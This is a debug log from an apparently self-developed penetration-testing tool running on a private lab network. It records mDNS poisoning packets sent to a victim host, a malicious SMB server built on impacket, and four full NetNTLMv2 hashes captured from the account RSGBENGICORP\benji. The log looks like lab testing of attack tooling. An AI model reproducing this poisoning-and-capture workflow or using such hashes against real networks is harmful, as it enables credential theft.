2021-11-14 17:57:25.967 | DEBUG    | project.ManInTheMiddle.maninthemiddle:do_mss:183 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe89:df69
            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
2021-11-15 08:43:02.064 | DEBUG    | project.igris:check_settable_variables_value:197 - Checking the correct value of the necessary settable variables 
2021-11-15 08:43:02.066 | INFO     | project.ManInTheMiddle.maninthemiddle:do_mss:211 - Running mss the results will be saved in : /home/rsgbengi/Igris 
2021-11-15 08:43:02.072 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-11-15 08:43:02.073 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:66 - Starting Malicious SMB Server ...
2021-11-15 08:43:02.076 | INFO     | impacket.smbserver:log:4132 - Config file parsed
2021-11-15 08:43:02.077 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-11-15 08:43:02.078 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-11-15 08:43:04.844 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:117 - Exiting smb relay attack ...
2021-11-15 08:43:07.537 | DEBUG    | project.ManInTheMiddle.maninthemiddle:do_mss:191 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe89:df69
            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
2021-11-15 08:43:07.538 | DEBUG    | project.igris:check_settable_variables_value:197 - Checking the correct value of the necessary settable variables 
2021-11-15 08:43:07.539 | INFO     | project.ManInTheMiddle.maninthemiddle:do_mss:211 - Running mss the results will be saved in : /home/rsgbengi/Igris 
2021-11-15 08:43:07.572 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-11-15 08:43:07.573 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:66 - Starting Malicious SMB Server ...
2021-11-15 08:43:07.575 | INFO     | impacket.smbserver:log:4132 - Config file parsed
2021-11-15 08:43:07.576 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-11-15 08:43:07.576 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-11-15 08:43:22.113 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-15 08:43:22.113 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-15 08:43:22.113 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to 192.168.253.130[0m
2021-11-15 08:43:22.147 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-15 08:43:22.147 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-15 08:43:22.147 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
2021-11-15 08:43:22.179 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-15 08:43:22.179 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-15 08:43:22.180 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-15 08:43:22.180 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-15 08:43:23.122 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-15 08:43:23.122 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-15 08:43:23.123 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-15 08:43:23.124 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-15 08:43:23.125 | INFO     | impacket.smbserver:log:4132 - Incoming connection (192.168.253.130,49876)
2021-11-15 08:43:23.148 | INFO     | impacket.smbserver:log:4132 - AUTHENTICATE_MESSAGE (RSGBENGICORP\benji,PC-BENJI)
2021-11-15 08:43:23.150 | INFO     | impacket.smbserver:log:4132 - User PC-BENJI\benji authenticated successfully
2021-11-15 08:43:23.154 | INFO     | impacket.smbserver:log:4132 - benji::RSGBENGICORP:aaaaaaaaaaaaaaaa:db3da16212d32b9c44d1e703ab607b93:0101000000000000808737d9fcd9d7013036eda95f0da88c000000000100100070004e0067004c004d007000790076000300100070004e0067004c004d0070007900760002001000450077006d0057004e0056007500500004001000450077006d0057004e0056007500500007000800808737d9fcd9d70106000400020000000800300030000000000000000000000000200000105772cfcbae8a42336172e83da7d0209cdc64cd8d64888ad939941eaddd38d20a001000000000000000000000000000000000000900280063006900660073002f006300610070007400750072006100740065002e006c006f00630061006c000000000000000000
2021-11-15 08:43:23.197 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrShareEnum Level: 1
2021-11-15 08:43:23.414 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-15 08:43:23.414 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-15 08:43:23.415 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-15 08:43:23.415 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-15 08:43:23.416 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-15 08:43:23.416 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-15 08:43:23.417 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-15 08:43:23.417 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-15 08:43:24.403 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-15 08:43:24.403 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-15 08:43:24.404 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-15 08:43:24.404 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-15 08:43:31.298 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-15 08:43:31.299 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-15 08:43:31.299 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to 192.168.253.130[0m
2021-11-15 08:43:31.331 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-15 08:43:31.331 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-15 08:43:31.331 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
2021-11-15 08:43:31.367 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-15 08:43:31.367 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-15 08:43:31.368 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-15 08:43:31.368 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-15 08:43:32.293 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-15 08:43:32.293 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-15 08:43:32.294 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-15 08:43:32.295 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-15 08:43:33.823 | INFO     | impacket.smbserver:log:4132 - Disconnecting Share(1:IPC$)
2021-11-15 08:43:33.825 | INFO     | impacket.smbserver:log:4132 - Closing down connection (192.168.253.130,49876)
2021-11-15 08:43:33.826 | INFO     | impacket.smbserver:log:4132 - Remaining connections []
2021-11-15 08:43:53.839 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-15 08:43:53.840 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-15 08:43:53.840 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to 192.168.253.130[0m
2021-11-15 08:43:53.863 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-15 08:43:53.863 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-15 08:43:53.863 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
2021-11-15 08:43:53.887 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-15 08:43:53.887 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-15 08:43:53.888 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-15 08:43:53.888 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-15 08:43:54.838 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-15 08:43:54.839 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-15 08:43:54.840 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-15 08:43:54.840 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-15 08:43:54.841 | INFO     | impacket.smbserver:log:4132 - Incoming connection (192.168.253.130,49878)
2021-11-15 08:43:54.862 | INFO     | impacket.smbserver:log:4132 - AUTHENTICATE_MESSAGE (RSGBENGICORP\benji,PC-BENJI)
2021-11-15 08:43:54.863 | INFO     | impacket.smbserver:log:4132 - User PC-BENJI\benji authenticated successfully
2021-11-15 08:43:54.864 | INFO     | impacket.smbserver:log:4132 - benji::RSGBENGICORP:aaaaaaaaaaaaaaaa:707795d193d8cef090a167df7e536c10:010100000000000000c1b1ebfcd9d701151989c7a9cf937c000000000100100070004e0067004c004d007000790076000300100070004e0067004c004d0070007900760002001000450077006d0057004e0056007500500004001000450077006d0057004e005600750050000700080000c1b1ebfcd9d70106000400020000000800300030000000000000000000000000200000105772cfcbae8a42336172e83da7d0209cdc64cd8d64888ad939941eaddd38d20a001000000000000000000000000000000000000900280063006900660073002f006300610070007400750072006100740065002e006c006f00630061006c000000000000000000
2021-11-15 08:43:54.877 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrShareEnum Level: 1
2021-11-15 08:43:56.110 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-15 08:43:56.111 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-15 08:43:56.112 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-15 08:43:56.112 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-15 08:43:56.113 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-15 08:43:56.113 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-15 08:43:56.114 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-15 08:43:56.114 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-15 08:43:57.119 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-15 08:43:57.120 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-15 08:43:57.121 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-15 08:43:57.121 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-15 08:44:05.539 | INFO     | impacket.smbserver:log:4132 - Disconnecting Share(1:IPC$)
2021-11-15 08:44:05.541 | INFO     | impacket.smbserver:log:4132 - Closing down connection (192.168.253.130,49878)
2021-11-15 08:44:05.542 | INFO     | impacket.smbserver:log:4132 - Remaining connections []
2021-11-15 08:53:00.283 | DEBUG    | project.ManInTheMiddle.maninthemiddle:do_mss:191 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe89:df69
            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
2021-11-15 08:53:00.283 | DEBUG    | project.igris:check_settable_variables_value:197 - Checking the correct value of the necessary settable variables 
2021-11-15 08:53:00.286 | INFO     | project.ManInTheMiddle.maninthemiddle:do_mss:211 - Running mss the results will be saved in : /home/rsgbengi/Igris 
2021-11-15 08:53:00.290 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-11-15 08:53:00.291 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:66 - Starting Malicious SMB Server ...
2021-11-15 08:53:00.294 | INFO     | impacket.smbserver:log:4132 - Config file parsed
2021-11-15 08:53:00.294 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-11-15 08:53:00.294 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-11-15 08:53:11.534 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-15 08:53:11.534 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-15 08:53:11.534 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to 192.168.253.130[0m
2021-11-15 08:53:11.567 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-15 08:53:11.568 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-15 08:53:11.568 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
2021-11-15 08:53:11.599 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-15 08:53:11.599 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-15 08:53:11.600 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-15 08:53:11.600 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-15 08:53:12.531 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-15 08:53:12.531 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-15 08:53:12.532 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-15 08:53:12.532 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-15 08:53:12.533 | INFO     | impacket.smbserver:log:4132 - Incoming connection (192.168.253.130,49885)
2021-11-15 08:53:12.561 | INFO     | impacket.smbserver:log:4132 - AUTHENTICATE_MESSAGE (RSGBENGICORP\benji,PC-BENJI)
2021-11-15 08:53:12.561 | INFO     | impacket.smbserver:log:4132 - User PC-BENJI\benji authenticated successfully
2021-11-15 08:53:12.567 | INFO     | impacket.smbserver:log:4132 - benji::RSGBENGICORP:aaaaaaaaaaaaaaaa:63c42b09f1e9151d7e323867d4ba552d:010100000000000000cc4938fed9d701b8785fc770ea34ec00000000010010004b006a00540078005800530064004b00030010004b006a00540078005800530064004b0002001000750050004c0041006f0046007800420004001000750050004c0041006f004600780042000700080000cc4938fed9d70106000400020000000800300030000000000000000000000000200000105772cfcbae8a42336172e83da7d0209cdc64cd8d64888ad939941eaddd38d20a001000000000000000000000000000000000000900280063006900660073002f006300610070007400750072006100740065002e006c006f00630061006c000000000000000000
2021-11-15 08:53:12.603 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrShareEnum Level: 1
2021-11-15 08:53:13.068 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-15 08:53:13.068 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-15 08:53:13.070 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-15 08:53:13.070 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-15 08:53:13.071 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-15 08:53:13.071 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-15 08:53:13.072 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-15 08:53:13.072 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-15 08:53:14.062 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-15 08:53:14.062 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-15 08:53:14.063 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-15 08:53:14.063 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-15 08:53:23.330 | INFO     | impacket.smbserver:log:4132 - Disconnecting Share(1:IPC$)
2021-11-15 08:53:23.350 | INFO     | impacket.smbserver:log:4132 - Closing down connection (192.168.253.130,49885)
2021-11-15 08:53:23.352 | INFO     | impacket.smbserver:log:4132 - Remaining connections []
2021-11-15 08:53:23.576 | SUCCESS  | project.ManInTheMiddle.maninthemiddle:__ends_process_in_the_background:60 - Finishing mss attack in the background ...
2021-11-15 08:53:30.865 | DEBUG    | project.ManInTheMiddle.maninthemiddle:do_mss:191 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe89:df69
            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
2021-11-15 08:53:30.865 | DEBUG    | project.igris:check_settable_variables_value:197 - Checking the correct value of the necessary settable variables 
2021-11-15 08:53:30.867 | INFO     | project.ManInTheMiddle.maninthemiddle:do_mss:211 - Running mss the results will be saved in : /home/rsgbengi/Igris 
2021-11-15 08:53:30.872 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
2021-11-15 08:53:30.872 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:66 - Starting Malicious SMB Server ...
2021-11-15 08:53:30.875 | INFO     | impacket.smbserver:log:4132 - Config file parsed
2021-11-15 08:53:30.876 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-11-15 08:53:30.877 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-11-15 08:53:34.561 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-15 08:53:34.562 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-15 08:53:34.562 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to 192.168.253.130[0m
2021-11-15 08:53:34.599 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-15 08:53:34.599 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-15 08:53:34.599 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:151 - [36mSending packet to fe80::40e1:1652:e0a3:7e8[0m
2021-11-15 08:53:34.631 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-15 08:53:34.631 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-15 08:53:34.632 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-15 08:53:34.632 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-15 08:53:35.560 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-15 08:53:35.561 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-15 08:53:35.562 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-15 08:53:35.562 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-15 08:53:35.564 | INFO     | impacket.smbserver:log:4132 - Incoming connection (192.168.253.130,49890)
2021-11-15 08:53:35.581 | INFO     | impacket.smbserver:log:4132 - AUTHENTICATE_MESSAGE (RSGBENGICORP\benji,PC-BENJI)
2021-11-15 08:53:35.582 | INFO     | impacket.smbserver:log:4132 - User PC-BENJI\benji authenticated successfully
2021-11-15 08:53:35.583 | INFO     | impacket.smbserver:log:4132 - benji::RSGBENGICORP:aaaaaaaaaaaaaaaa:bf0d250ed50074d3d1362a037d328180:01010000000000008051ff45fed9d7012f8b101463b8774900000000010010007300690073004900550047005a005800030010007300690073004900550047005a00580002001000710048004d004a00740053006900440004001000710048004d004a007400530069004400070008008051ff45fed9d70106000400020000000800300030000000000000000000000000200000105772cfcbae8a42336172e83da7d0209cdc64cd8d64888ad939941eaddd38d20a001000000000000000000000000000000000000900280063006900660073002f006300610070007400750072006100740065002e006c006f00630061006c000000000000000000
2021-11-15 08:53:35.597 | INFO     | impacket.dcerpc.v5.rpcrt:log:1502 - NetrShareEnum Level: 1
2021-11-15 08:53:36.538 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-15 08:53:36.538 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-15 08:53:36.539 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-15 08:53:36.539 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-15 08:53:36.540 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-15 08:53:36.540 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
2021-11-15 08:53:36.541 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:148 - Packet crafted: 
2021-11-15 08:53:36.541 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:send_packet:149 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
2021-11-15 08:53:46.340 | INFO     | impacket.smbserver:log:4132 - Disconnecting Share(1:IPC$)
2021-11-15 08:53:46.342 | INFO     | impacket.smbserver:log:4132 - Closing down connection (192.168.253.130,49890)
2021-11-15 08:53:46.342 | INFO     | impacket.smbserver:log:4132 - Remaining connections []
2021-11-15 09:07:28.066 | DEBUG    | project.ManInTheMiddle.maninthemiddle:do_mss:191 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe89:df69
            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
2021-11-15 09:07:28.067 | DEBUG    | project.igris:check_settable_variables_value:197 - Checking the correct value of the necessary settable variables 
2021-11-15 09:07:28.075 | INFO     | project.ManInTheMiddle.maninthemiddle:do_mss:211 - Running mss the results will be saved in : /home/rsgbengi/Igris 
2021-11-15 09:07:28.082 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_mdns_poisoning:190 - Starting mdns poisoning...
